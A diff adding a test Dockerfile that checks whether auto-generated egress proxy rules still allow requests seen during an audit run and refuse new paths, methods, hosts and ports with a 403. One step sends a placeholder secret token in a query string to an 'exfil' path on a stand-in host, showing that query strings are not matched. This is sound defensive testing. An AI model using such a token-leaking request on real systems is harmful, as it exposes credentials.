@@ -1,0 +1,82 @@
+# Run under the rules an `audit` run generated for itself.
+#
+# The first half repeats exactly what Dockerfile.inspect-audit did, so every
+# request must still succeed: rules that broke the build they were learned from
+# would make the audit-then-restrict workflow worthless.
+#
+# The second half asks for things that build never did. They must be refused,
+# or the rules would only look narrow without being so.
+FROM alpine/curl@sha256:1a4d725751c5bd50297ee243db5d4df8ac5aabdf7030dd40dcec3bc3fdaa1cfa
+
+SHELL ["/bin/sh", "-c"]
+
+ENV S='curl -sS --max-time 10'
+ENV C='curl -sS -o /dev/null -w %{http_code} --max-time 10'
+
+# ---------------------------------------------------------------------------
+# Still permitted
+# ---------------------------------------------------------------------------
+
+RUN echo "=== [same as audit: HTTPS] ===" && \
+    OUT=$($S https://allowed.example.com/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# The prefix the generator kept has to cover every path it was learned from.
+RUN echo "=== [same as audit: varying paths] ===" && \
+    $S https://allowed.example.com/public/a/one.tgz && \
+    $S https://allowed.example.com/public/b/two.tgz && \
+    echo "OK"
+
+RUN echo "=== [same as audit: POST] ===" && \
+    OUT=$($S -X POST https://api.example.com/v1/thing) && \
+    echo "$OUT" && \
+    case "$OUT" in API\ POST*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+RUN echo "=== [same as audit: plaintext on 9080] ===" && \
+    OUT=$($S http://allowed.example.com:9080/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+RUN echo "=== [same as audit: TLS on 9443] ===" && \
+    OUT=$($S https://allowed.example.com:9443/private/secret) && \
+    echo "$OUT" && \
+    case "$OUT" in PRIVATE\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# A query string was dropped when the rule was written, and queries are not
+# matched on, so the same request still goes through.
+RUN echo "=== [same as audit: query string] ===" && \
+    OUT=$($S "https://blocked.example.com/exfil?token=SECRET-VALUE") && \
+    echo "$OUT" && \
+    case "$OUT" in ROOT\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# ---------------------------------------------------------------------------
+# Now refused: none of these happened during the audit run
+# ---------------------------------------------------------------------------
+
+# A path outside the prefix the generator kept.
+RUN echo "=== [new: path outside the learned prefix] ===" && \
+    CODE=$($C https://allowed.example.com/private/secret) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# A method the audit run never used on a URL it did use.
+RUN echo "=== [new: method never observed] ===" && \
+    CODE=$($C -X POST https://allowed.example.com/public/pkg.tgz) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# A sibling of an allowed host. Hosts are enumerated, never generalised, so
+# nothing was widened to cover this.
+RUN echo "=== [new: host never observed] ===" && \
+    CODE=$($C https://other.example.com/public/pkg.tgz) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# The same origin on a port the audit run never reached.
+RUN echo "=== [new: port never observed] ===" && \
+    CODE=$($C https://allowed.example.com:8443/public/pkg.tgz) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+RUN echo "=== End of test ==="
